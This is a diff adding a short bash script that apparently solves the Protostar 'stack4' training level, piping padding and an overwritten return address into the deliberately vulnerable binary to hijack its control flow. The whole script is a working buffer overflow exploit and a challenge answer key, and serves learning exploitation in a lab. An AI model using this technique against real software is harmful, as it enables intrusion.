@@ -1,0 +1,3 @@
+#!/bin/bash
+# Simple Buffer Overflow - return address overwritten
+echo -n -e AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS\\xf4\\x83\\x04\\x08 | /opt/protostar/bin/stack4
